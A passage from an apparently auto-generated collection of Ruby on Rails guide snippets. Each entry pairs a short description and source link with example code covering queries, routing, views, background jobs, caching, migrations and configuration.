`Customer.first` method in Rails. It selects all columns from the `customers` table, orders the results by the `id` column in ascending order, and limits the result to 1 record, effectively fetching the first row ordered by primary key.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_19\n\nLANGUAGE: sql\nCODE:\n```\nSELECT * FROM customers ORDER BY customers.id ASC LIMIT 1\n```\n\n----------------------------------------\n\nTITLE: Running Rails Routes Command\nDESCRIPTION: This bash command executes the `rails routes` task, which displays a list of all defined routes in the Rails application. This is useful for verifying that routes are configured correctly.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_40\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails routes\n```\n\n----------------------------------------\n\nTITLE: Inspecting custom Active Model error messages\nDESCRIPTION: Demonstrates inspecting the custom error messages created with the previous Active Model and YAML configurations. It shows how the `full_messages` and `messages` methods return the formatted error messages.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_32\n\nLANGUAGE: irb\nCODE:\n```\nirb> person = Person.new.tap(&:valid?)\n\nirb> person.errors.full_messages\n=> [\n  \"Invalid Name (can't be blank)\",\n  \"Please fill in your Age\"\n]\n\nirb> person.errors.messages\n=> {\n  :name => [\"can't be blank\"],\n  :age  => [\"Please fill in your Age\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Conditional GET with Strong ETag\nDESCRIPTION: This snippet shows how to use a strong ETag with the `fresh_when` helper.  A strong ETag requires that the response be byte-for-byte identical to the cached version.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/caching_with_rails.md#_snippet_51\n\nLANGUAGE: ruby\nCODE:\n```\nclass ProductsController < ApplicationController\n  def show\n    @product = Product.find(params[:id])\n    fresh_when last_modified: @product.published_at.utc, strong_etag: @product\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Rendering Collections with Partials in Rails\nDESCRIPTION: This example shows how to render a collection of objects using a partial template for each object in the collection. It demonstrates the concise syntax for iterating over `@products` and rendering the `_product.html.erb` partial for each product, automatically making the current `product` available as a local variable.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_view_overview.md#_snippet_21\n\nLANGUAGE: erb\nCODE:\n```\n<% @products.each do |product| %>\n  <%= render partial: \"product\", locals: { product: product } %>\n<% end %>\n```\n\nLANGUAGE: erb\nCODE:\n```\n<%= render partial: \"product\", collection: @products %>\n```\n\nLANGUAGE: erb\nCODE:\n```\n<%= render @products %>\n```\n\n----------------------------------------\n\nTITLE: Setting the queue using set option\nDESCRIPTION: This snippet shows how to set the queue using the `:queue` option within the `set` method when enqueuing a job. This allows for specifying the queue at the point of enqueuing the job.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_job_basics.md#_snippet_28\n\nLANGUAGE: ruby\nCODE:\n```\nMyJob.set(queue: :another_queue).perform_later(record)\n```\n\n----------------------------------------\n\nTITLE: Sending Weekly Summary Emails\nDESCRIPTION: Example of sending immediate emails using deliver_now, useful for background jobs like cron tasks.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_mailer_basics.md#2025-04-23_snippet_10\n\nLANGUAGE: ruby\nCODE:\n```\nclass SendWeeklySummary\n  def run\n    User.find_each do |user|\n      UserMailer.with(user: user).weekly_summary.deliver_now\n    end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Using redirect_back in Rails 5.1\nDESCRIPTION: Example of using redirect_back with a fallback_location parameter, which replaces the deprecated redirect_to :back functionality in Rails 5.1.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_48\n\nLANGUAGE: ruby\nCODE:\n```\nredirect_back(fallback_location: root_path)\n```\n\n----------------------------------------\n\nTITLE: Initializing the Rails Server Instance (Ruby)\nDESCRIPTION: The constructor (`initialize`) for the `Rails::Server` class, defined in `rails/commands/server/server_command.rb`, sets up the server object. It stores the provided `options` hash (often from `server_options`), calls the initializer of its superclass (`Rackup::Server`) passing these options along, and then invokes the `set_environment` method to establish the correct Rails environment (e.g., development, production) based on the options.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/initialization.md#2025-04-23_snippet_5\n\nLANGUAGE: ruby\nCODE:\n```\nmodule Rails\n  class Server < Rackup::Server\n    def initialize(options = nil)\n      @default_options = options || {}\n      super(@default_options)\n      set_environment\n    end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Unsubscribes Controller Implementation in Rails\nDESCRIPTION: This code snippet implements the `UnsubscribesController`, which handles the unsubscription process. It includes an `allow_unauthenticated_access` declaration, a `before_action` to set the subscriber based on the token, and a `show` action that destroys the subscriber record and redirects to the homepage with a success message. The `set_subscriber` method retrieves the subscriber based on the token passed in the parameters.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_116\n\nLANGUAGE: ruby\nCODE:\n```\nclass UnsubscribesController < ApplicationController\n  allow_unauthenticated_access\n  before_action :set_subscriber\n\n  def show\n    @subscriber&.destroy\n    redirect_to root_path, notice: \"Unsubscribed successfully.\"\n  end\n\n  private\n\n  def set_subscriber\n    @subscriber = Subscriber.find_by_token_for(:unsubscribe, params[:token])\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Adding Subscriber Association to Product Model (Rails)\nDESCRIPTION: This code snippet adds a `has_many` association to the Product model, linking it to the Subscriber model. The `dependent: :destroy` option ensures that subscribers are deleted when the associated product is deleted.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_100\n\nLANGUAGE: ruby\nCODE:\n```\nclass Product < ApplicationRecord\n  has_many :subscribers, dependent: :destroy\n  has_one_attached :featured_image\n  has_rich_text :description\n\n  validates :name, presence: true\n  validates :inventory_count, numericality: { greater_than_or_equal_to: 0 }\nend\n```\n\n----------------------------------------\n\nTITLE: Validating Inclusion Using a Dynamic Set (Proc) in Rails (Ruby)\nDESCRIPTION: Demonstrates dynamic validation using the `inclusion` helper in a `Coffee` model. The set of allowed values for the `size` attribute is determined at runtime by executing a lambda (`->(coffee) { coffee.available_sizes }`), which calls the `available_sizes` instance method.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_validations.md#2025-04-23_snippet_22\n\nLANGUAGE: ruby\nCODE:\n```\nclass Coffee < ApplicationRecord\n  validates :size, inclusion: { in: ->(coffee) { coffee.available_sizes } }\n\n  def available_sizes\n    %w(small medium large extra_large)\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Configuring Solid Queue in Development Environment\nDESCRIPTION: This code configures Solid Queue as the queue adapter for Active Job in the development environment. It sets the `queue_adapter` to `:solid_queue` and configures the connection to the `queue` database for writing.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_job_basics.md#_snippet_9\n\nLANGUAGE: ruby\nCODE:\n```\n# config/environments/development.rb\nconfig.active_job.queue_adapter = :solid_queue\nconfig.solid_queue.connects_to = { database: { writing: :queue } }\n```\n\n----------------------------------------\n\nTITLE: SQL Query with Chained Where Clauses (SQL)\nDESCRIPTION: This SQL query shows the result of chaining `where` clauses. The query filters for books where `out_of_print` is true (1) AND `out_of_print` is false (0).\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_124\n\nLANGUAGE: sql\nCODE:\n```\nSELECT * FROM books WHERE out_of_print = 1 AND out_of_print = 0\n```\n\n----------------------------------------\n\nTITLE: Configuring NGINX as a Reverse Proxy for Rails\nDESCRIPTION: This NGINX configuration sets up a reverse proxy for a Rails application, forwarding requests to an application server (e.g., Unicorn) listening on port 8080. It includes settings for forwarding headers and handling static files.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_103\n\nLANGUAGE: nginx\nCODE:\n```\nupstream application_server {\n  server 0.0.0.0:8080;\n}\n\nserver {\n  listen 80;\n  server_name localhost;\n\n  root /root/path/to/your_app/public;\n\n  try_files $uri/index.html $uri.html @app;\n\n  location @app {\n    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\n    proxy_set_header Host $http_host;\n    proxy_redirect off;\n    proxy_pass http://application_server;\n  }\n\n  # some other configuration\n}\n```\n\n----------------------------------------\n\nTITLE: Saving the Record to the Database\nDESCRIPTION: This command saves the `Product` instance to the database, persisting the data. It generates an `INSERT` SQL query to insert the record into the `products` table.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_14\n\nLANGUAGE: irb\nCODE:\n```\nstore(dev)> product.save\n```\n\n----------------------------------------\n\nTITLE: Using Partials to Simplify Views (HTML+ERB)\nDESCRIPTION: This HTML+ERB example demonstrates how to use partials to break up a view into smaller, reusable chunks. It includes partials for an ad banner, individual product rendering, and a footer, making the main view more readable.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_view_overview.md#_snippet_12\n\nLANGUAGE: HTML+ERB\nCODE:\n```\n<%= render \"application/ad_banner\" %>\n\n<h1>Products</h1>\n\n<p>Here are a few of our fine products:</p>\n<% @products.each do |product| %>\n  <%= render partial: \"product\", locals: { product: product } %>\n<% end %>\n\n<%= render \"application/footer\" %>\n```\n\n----------------------------------------\n\nTITLE: Retrieving CSRF Token in JavaScript\nDESCRIPTION: This JavaScript snippet shows how to retrieve the CSRF token from the meta tag in the HTML head for use in AJAX requests.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/working_with_javascript_in_rails.md#2025-04-23_snippet_17\n\nLANGUAGE: javascript\nCODE:\n```\ndocument.head.querySelector(\"meta[name=csrf-token]\")?.content\n```\n\n----------------------------------------\n\nTITLE: Implementing JSON Patch support in Rails controllers\nDESCRIPTION: Demonstrates how to add support for the JSON Patch media type in a Rails controller by registering a new MIME type and handling it in the controller action.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_86\n\nLANGUAGE: ruby\nCODE:\n```\n# in your controller:\ndef update\n  respond_to do |format|\n    format.json do\n      # perform a partial update\n      @article.update params[:article]\n    end\n\n    format.json_patch do\n      # perform sophisticated change\n    end\n  end\nend\n```\n\nLANGUAGE: ruby\nCODE:\n```\n# config/initializers/json_patch.rb\nMime::Type.register \"application/json-patch+json\", :json_patch\n```\n\n----------------------------------------\n\nTITLE: Creating New Rails Application\nDESCRIPTION: Demonstrates how to create a new Rails application using the rails new command, showing the standard output of directory and file creation.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/command_line.md#2025-04-23_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\n$ rails new my_app\n     create\n     create  README.md\n     create  Rakefile\n     create  config.ru\n     create  .gitignore\n     create  Gemfile\n     create  app\n     ...\n     create  tmp/cache\n     ...\n        run  bundle install\n```\n\n----------------------------------------\n\nTITLE: Precompiling Assets with Rails from the Command-Line (Bash)\nDESCRIPTION: Runs the Rails asset precompilation process for production using the 'assets:precompile' rake task. Requires a Rails application and the RAILS_ENV environment variable set to 'production'. Input is the command itself, output is the creation/compilation of digested assets in the public/assets directory. This is typically used during deployment to ensure up-to-date asset delivery.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/asset_pipeline.md#2025-04-23_snippet_11\n\nLANGUAGE: bash\nCODE:\n```\n$ RAILS_ENV=production rails assets:precompile\n```\n\n----------------------------------------\n\nTITLE: Configuring Cache Store with Options\nDESCRIPTION: This snippet demonstrates how to configure a cache store (in this case, `:memory_store`) with additional options, such as the `size` option. It sets the cache size to 64 megabytes.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/caching_with_rails.md#_snippet_34\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.cache_store = :memory_store, { size: 64.megabytes }\n```\n\n----------------------------------------\n\nTITLE: Creating a Book Without Associations in Ruby on Rails\nDESCRIPTION: This snippet demonstrates how to create a book for an author without using associations, requiring manual specification of the author_id.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_2\n\nLANGUAGE: Ruby\nCODE:\n```\n@book = Book.create(author_id: @author.id, published_at: Time.now)\n```\n\n----------------------------------------\n\nTITLE: Integrating Capybara Assertions in ActionView::TestCase\nDESCRIPTION: This code demonstrates how to integrate Capybara assertions into `ActionView::TestCase` by defining a base class that transforms the `document_root_element` into a `page` method, which is used by Capybara.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_85\n\nLANGUAGE: ruby\nCODE:\n```\n# test/view_partial_test_case.rb\n\nrequire \"test_helper\"\nrequire \"capybara/minitest\"\n\nclass ViewPartialTestCase < ActionView::TestCase\n  include Capybara::Minitest::Assertions\n\n  def page\n    Capybara.string(rendered)\n  end\nend\n\n# test/views/article_partial_test.rb\n\nrequire \"view_partial_test_case\"\n\nclass ArticlePartialTest < ViewPartialTestCase\n  test \"renders a link to itself\" do\n    article = Article.create! title: \"Hello, world\"\n\n    render \"articles/article\", article: article\n\n    assert_link article.title, href: article_url(article)\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Rendering Heterogeneous Collections (index.html.erb)\nDESCRIPTION: This snippet demonstrates rendering a heterogeneous collection containing different model types.  Rails automatically selects the correct partial based on the class of each object in the collection. Requires `_customer.html.erb` and `_employee.html.erb` partials to exist.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_87\n\nLANGUAGE: html+erb\nCODE:\n```\n<h1>Contacts</h1>\n<%= render [customer1, employee1, customer2, employee2] %>\n```\n\n----------------------------------------\n\nTITLE: Action Cable Channel Exception Handling in Ruby\nDESCRIPTION: This code demonstrates how to handle exceptions within an Action Cable channel using `rescue_from`. It defines a `deliver_error_message` method that broadcasts an error message to the channel subscribers.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_cable_overview.md#_snippet_7\n\nLANGUAGE: Ruby\nCODE:\n```\n# app/channels/chat_channel.rb\nclass ChatChannel < ApplicationCable::Channel\n  rescue_from \"MyError\", with: :deliver_error_message\n\n  private\n    def deliver_error_message(e)\n      # broadcast_to(...)\n    end\nend\n```\n\n----------------------------------------\n\nTITLE: Enqueuing Multiple Active Job Classes with perform_all_later (Ruby)\nDESCRIPTION: This snippet showcases how to enqueue instances of different Active Job classes within the same `perform_all_later` call.  It instantiates `GuestsCleanupJob`, `ExportDataJob`, and `NotifyGuestsJob` with their respective arguments and then enqueues them together. This demonstrates the flexibility of `perform_all_later` in handling diverse job types.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_job_basics.md#_snippet_35\n\nLANGUAGE: ruby\nCODE:\n```\nclass ExportDataJob < ApplicationJob\n  def perform(*args)\n    # Export data\n  end\nend\n\nclass NotifyGuestsJob < ApplicationJob\n  def perform(*guests)\n    # Email guests\n  end\nend\n\n# Instantiate job instances\ncleanup_job = GuestsCleanupJob.new(guest)\nexport_job = ExportDataJob.new(data)\nnotify_job = NotifyGuestsJob.new(guest)\n\n# Enqueues job instances from multiple classes at once\nActiveJob.perform_all_later(cleanup_job, export_job, notify_job)\n```\n\n----------------------------------------\n\nTITLE: Creating Join Table (Ruby)\nDESCRIPTION: This migration creates a join table named `users_products` to manage the many-to-many relationship between users and products. It sets up the table with user_id and product_id columns, and comments out suggested indexes.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_migrations.md#_snippet_19\n\nLANGUAGE: Ruby\nCODE:\n```\nclass CreateJoinTableUserProduct < ActiveRecord::Migration[8.1]\n  def change\n    create_join_table :users, :products do |t|\n      # t.index [:user_id, :product_id]\n      # t.index [:product_id, :user_id]\n    end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Setting the Root Route in Rails\nDESCRIPTION: This Ruby code snippet sets the root route of the Rails application to the `index` action of the `ProductsController`. When a user visits the root URL, Rails will render the `products#index` view.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_44\n\nLANGUAGE: ruby\nCODE:\n```\nroot \"products#index\"\n```\n\n----------------------------------------\n\nTITLE: Unscoping Specific Where Clause in Active Record (Ruby)\nDESCRIPTION: This snippet shows how to use the `unscope` method to remove a specific `where` clause condition (in this case, the `id` condition) from an Active Record query. This allows for retrieval of records without the specified condition.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_102\n\nLANGUAGE: ruby\nCODE:\n```\nBook.where(id: 10, out_of_print: false).unscope(where: :id)\n```\n\n----------------------------------------\n\nTITLE: Excluding Elements with exclude? in Ruby\nDESCRIPTION: This snippet illustrates the `exclude?` method, which checks if an object is *not* present in a collection. It's the negation of `include?`. Defined in `active_support/core_ext/enumerable.rb`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_113\n\nLANGUAGE: ruby\nCODE:\n```\nto_visit << node if visited.exclude?(node)\n```\n\n----------------------------------------\n\nTITLE: Equality Condition with Tuple Syntax in Rails\nDESCRIPTION: Demonstrates how to use tuple-like syntax for hash conditions, where the key is an array of columns and the value is an array of tuples. This is useful for querying relations with composite primary keys.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_62\n\nLANGUAGE: ruby\nCODE:\n```\nBook.where([:author_id, :id] => [[15, 1], [15, 2]])\n```\n\n----------------------------------------\n\nTITLE: Attribute-based Accessor Methods (IRB)\nDESCRIPTION: This series of IRB snippets demonstrates attribute-based accessor methods in Active Model Dirty. These methods include `[attr_name]_changed?`, `[attr_name]_was`, `[attr_name]_change`, `[attr_name]_previously_changed?`, and `[attr_name]_previous_change`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_model_basics.md#_snippet_21\n\nLANGUAGE: irb\nCODE:\n```\nirb> person = Person.new\n\nirb> person.changed?\n=> false\n\nirb> person.first_name = \"John Doe\"\nirb> person.first_name\n=> \"John Doe\"\n```\n\nLANGUAGE: irb\nCODE:\n```\nirb> person.first_name_changed?\n=> true\n```\n\nLANGUAGE: irb\nCODE:\n```\nirb> person.first_name_was\n=> nil\n```\n\nLANGUAGE: irb\nCODE:\n```\nirb> person.first_name_change\n=> [nil, \"John Doe\"]\nirb> person.last_name_change\n=> nil\n```\n\nLANGUAGE: irb\nCODE:\n```\nirb> person.first_name_previously_changed?\n=> false\nirb> person.save\nirb> person.first_name_previously_changed?\n=> true\n```\n\nLANGUAGE: irb\nCODE:\n```\nirb> person.first_name_previous_change\n=> [nil, \"John Doe\"]\n```\n\n----------------------------------------\n\nTITLE: ActiveSupport::Callbacks explicit block argument in Ruby\nDESCRIPTION: Shows the change in ActiveSupport::Callbacks syntax for Rails 4.1, which now requires an explicit block parameter rather than a block capture pattern.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_89\n\nLANGUAGE: ruby\nCODE:\n```\n# Previously in Rails 4.0\nset_callback :save, :around, ->(r, &block) { stuff; result = block.call; stuff }\n\n# Now in Rails 4.1\nset_callback :save, :around, ->(r, block) { stuff; result = block.call; stuff }\n```\n\n----------------------------------------\n\nTITLE: Implementing Custom Key Providers for Encryption\nDESCRIPTION: Shows how to implement and configure custom key providers for encryption in Rails models.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_encryption.md#2025-04-23_snippet_11\n\nLANGUAGE: ruby\nCODE:\n```\nclass MyKeyProvider\n  def encryption_key\n  end\n\n  def decryption_keys(encrypted_message)\n  end\nend\n```\n\nLANGUAGE: ruby\nCODE:\n```\nclass Article < ApplicationRecord\n  encrypts :summary, key_provider: ArticleKeyProvider.new\nend\n```\n\n----------------------------------------\n\nTITLE: Collection Caching with I18n with ERB\nDESCRIPTION: Configures the cache key for collection caching by prefixing it with the current locale. This ensures that different localizations of the product page do not overwrite each other.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/caching_with_rails.md#_snippet_3\n\nLANGUAGE: html+erb\nCODE:\n```\n<%= render partial: 'products/product',\n           collection: @products,\n           cached: ->(product) { [I18n.locale, product] } %>\n```\n\n----------------------------------------\n\nTITLE: Configuring Retry Deadline for MySQL (YAML)\nDESCRIPTION: This YAML snippet configures the `retry_deadline` for MySQL in the development environment. This setting specifies a time in seconds after which retries will no longer be attempted, even if `connection_retries` is set and the query is retryable.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_98\n\nLANGUAGE: yaml\nCODE:\n```\ndevelopment:\n  adapter: mysql2\n  retry_deadline: 5 # Stop retrying queries after 5 seconds\n```\n\n----------------------------------------\n\nTITLE: Configuring Session Key - Ruby\nDESCRIPTION: This example shows how to configure the session key (cookie name) in a Rails application.  It sets the session store to `:cookie_store` and specifies the key as `_your_app_session`. This customization allows for a more descriptive cookie name.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_controller_overview.md#_snippet_34\n\nLANGUAGE: ruby\nCODE:\n```\nRails.application.config.session_store :cookie_store, key: \"_your_app_session\"\n```\n\n----------------------------------------\n\nTITLE: Defining Default Parameters with a Defaults Block - Ruby\nDESCRIPTION: This snippet uses a `defaults` block to define the `format` parameter for both the `photos` and `articles` resources. This is a concise way to define defaults for multiple routes.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/routing.md#_snippet_36\n\nLANGUAGE: ruby\nCODE:\n```\ndefaults format: :json do\n  resources :photos\n  resources :articles\nend\n```\n\n----------------------------------------\n\nTITLE: Find or Initialize Customer in Rails\nDESCRIPTION: This Ruby code demonstrates the use of `find_or_initialize_by` to find a customer with the first name 'Nina'. If a customer with that name exists, it returns the existing record. If not, it creates a new customer instance in memory but does not save it to the database.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_190\n\nLANGUAGE: ruby\nCODE:\n```\nnina = Customer.find_or_initialize_by(first_name: 'Nina')\n```\n\n----------------------------------------\n\nTITLE: Association Absence Validation\nDESCRIPTION: Demonstrates how to validate the absence of an association in a model.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_validations.md#2025-04-23_snippet_11\n\nLANGUAGE: ruby\nCODE:\n```\nclass LineItem < ApplicationRecord\n  belongs_to :order, optional: true\n  validates :order, absence: true\nend\n```\n\n----------------------------------------\n\nTITLE: Creating Migration for New Table with Foreign Key in Rails\nDESCRIPTION: Shows how to create a migration for a new table that includes a foreign key reference using belongs_to. This migration creates the books table with an author reference, supporting the Book-Author association.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_94\n\nLANGUAGE: ruby\nCODE:\n```\nclass CreateBooks < ActiveRecord::Migration[8.1]\n  def change\n    create_table :books do |t|\n      t.datetime   :published_at\n      t.string     :book_number\n      t.belongs_to :author\n    end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Updating Logger Broadcast API in Rails 7.1\nDESCRIPTION: Code examples showing how to migrate from the old ActiveSupport::Logger.broadcast API to the new BroadcastLogger API in Rails 7.1, which changes how logs are broadcast to multiple destinations.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_10\n\nLANGUAGE: ruby\nCODE:\n```\nlogger = Logger.new(\"some_file.log\")\n\n# Before\n\nRails.logger.extend(ActiveSupport::Logger.broadcast(logger))\n\n# After\n\nRails.logger.broadcast_to(logger)\n```\n\n----------------------------------------\n\nTITLE: Creating ApplicationJob Class for Rails 5.0 Upgrade\nDESCRIPTION: Creates the required ApplicationJob class that inherits from ActiveJob::Base, which is necessary when upgrading from Rails 4.2 to Rails 5.0 as job classes now inherit from ApplicationJob by default.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_49\n\nLANGUAGE: ruby\nCODE:\n```\nclass ApplicationJob < ActiveJob::Base\nend\n```\n\n----------------------------------------\n\nTITLE: Retrieving the first record with order\nDESCRIPTION: This code shows how to retrieve the first record with a custom ordering specified using the `order` method. The records are ordered by the `first_name` column.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_24\n\nLANGUAGE: irb\nCODE:\n```\nirb> customer = Customer.order(:first_name).first\n=> #<Customer id: 2, first_name: \"Fifo\">\n```\n\n----------------------------------------\n\nTITLE: Starting the queue for job processing\nDESCRIPTION: This command starts the Solid Queue worker process, which is responsible for processing enqueued jobs. It monitors the queue database for new jobs and executes them accordingly.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_job_basics.md#_snippet_12\n\nLANGUAGE: bash\nCODE:\n```\nbin/jobs start\n```\n\n----------------------------------------\n\nTITLE: Asserting Generated Route (Rails Test)\nDESCRIPTION: Demonstrates how to use `assert_generates` to test that a set of options generates the expected path. This assertion is used to verify the correctness of your routes, both default and custom.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/routing.md#_snippet_87\n\nLANGUAGE: ruby\nCODE:\n```\nassert_generates \"/photos/1\", { controller: \"photos\", action: \"show\", id: \"1\" }\nassert_generates \"/about\", controller: \"pages\", action: \"about\"\n```\n\n----------------------------------------\n\nTITLE: Accessing Rails Application Credentials\nDESCRIPTION: Ruby code example showing how to access credentials stored in the encrypted credentials file, including standard access and using the bang method to raise exceptions for missing keys.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/security.md#2025-04-23_snippet_78\n\nLANGUAGE: ruby\nCODE:\n```\n# When some_api_key is blank...\nRails.application.credentials.some_api_key! # => KeyError: :some_api_key is blank\n```\n\n----------------------------------------\n\nTITLE: Configuring Test-Specific Storage Services in YAML\nDESCRIPTION: Test-specific storage configuration that overrides the default services, using local disk storage instead of actual cloud services during testing.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_storage_overview.md#2025-04-23_snippet_84\n\nLANGUAGE: yaml\nCODE:\n```\ntest:\n  service: Disk\n  root: <%= Rails.root.join(\"tmp/storage\") %>\n\ns3:\n  service: Disk\n  root: <%= Rails.root.join(\"tmp/storage\") %>\n```\n\n----------------------------------------\n\nTITLE: Defining Composite Primary Key and Association\nDESCRIPTION: This snippet defines two models, `Order` and `Book`, with an association. The `Order` model specifies a composite primary key using `self.primary_key = [:shop_id, :id]`, and the `Book` model belongs to the `Order` model using `belongs_to :order`. Rails will assume the foreign key is `:order_id` by default.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_composite_primary_keys.md#_snippet_7\n\nLANGUAGE: ruby\nCODE:\n```\nclass Order < ApplicationRecord\n  self.primary_key = [:shop_id, :id]\n  has_many :books\nend\n\nclass Book < ApplicationRecord\n  belongs_to :order\nend\n```\n\n----------------------------------------\n\nTITLE: Creating a New API-only Rails Application\nDESCRIPTION: Command to generate a new Rails application configured for API-only use. This setup includes limited middleware and skips browser-specific features.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/api_app.md#2025-04-23_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\n$ rails new my_api --api\n```\n\n----------------------------------------\n\nTITLE: Create Table Migration (Ruby)\nDESCRIPTION: This migration file creates a 'products' table including string columns for 'name' and 'part_number' and adds timestamps. It provides a base schema for the products table.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_migrations.md#_snippet_5\n\nLANGUAGE: ruby\nCODE:\n```\nclass CreateProducts < ActiveRecord::Migration[8.1]\n  def change\n    create_table :products do |t|\n      t.string :name\n      t.string :part_number\n\n      t.timestamps\n    end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Permitting Parameters with Fetch in Rails\nDESCRIPTION: This example demonstrates how to permit parameters using `fetch` in a Rails controller. It supplies a default value (an empty hash) and then applies the `permit` method to whitelist the desired attributes. This approach is useful when the root key might not exist.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_controller_overview.md#_snippet_15\n\nLANGUAGE: ruby\nCODE:\n```\n# using `fetch` you can supply a default and use\n# the Strong Parameters API from there.\nparams.fetch(:blog, {}).permit(:title, :author)\n```\n\n----------------------------------------\n\nTITLE: Date and Time Helpers in Rails Forms\nDESCRIPTION: This snippet demonstrates how to use date and time related helpers in Rails forms. It includes examples for date, time, datetime-local, month, and week fields. These helpers generate corresponding HTML input elements with appropriate type attributes.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/form_helpers.md#_snippet_9\n\nLANGUAGE: erb\nCODE:\n```\n<%= form.date_field :born_on %>\n<%= form.time_field :started_at %>\n<%= form.datetime_local_field :graduation_day %>\n<%= form.month_field :birthday_month %>\n<%= form.week_field :birthday_week %>\n```\n\n----------------------------------------\n\nTITLE: Accessing Validation Errors in IRB\nDESCRIPTION: This snippet demonstrates how to access validation errors using the `errors` object after calling `valid?`. It shows how to retrieve errors as a hash using `to_hash` and as a list of full messages using `full_messages`. This allows you to inspect the specific validation failures and provide feedback to the user.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_model_basics.md#_snippet_36\n\nLANGUAGE: irb\nCODE:\n```\nirb> person = Person.new\n\nirb> person.email = \"me\"\nirb> person.valid?\n=> # Raises Token can't be blank (ActiveModel::StrictValidationFailed)\n\nirb> person.errors.to_hash\n=> {:name => [\"can't be blank\"], :email => [\"is invalid\"]}\n\nirb> person.errors.full_messages\n=> [\"Name can't be blank\", \"Email is invalid\"]\n```\n\n----------------------------------------\n\nTITLE: Configuring Log Tags for Action Cable Connections\nDESCRIPTION: This snippet demonstrates how to configure log tags for Action Cable connections in Rails. Log tags can be customized using a lambda function to include dynamic information like user account ID or request UUID.  These tags are then included in the log output for each connection.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_cable_overview.md#_snippet_31\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.action_cable.log_tags = [\n  -> request { request.env[\"user_account_id\"] || \"no-account\" },\n  :action_cable,\n  -> request { request.uuid }\n]\n```\n\n----------------------------------------\n\nTITLE: Configuring JavaScript Import Map - Ruby\nDESCRIPTION: This code snippet shows the configuration of the JavaScript import map in `config/importmap.rb`. It pins various JavaScript packages, including `application`, `@hotwired/turbo-rails`, `@hotwired/stimulus`, and `@hotwired/stimulus-loading`, mapping them to their 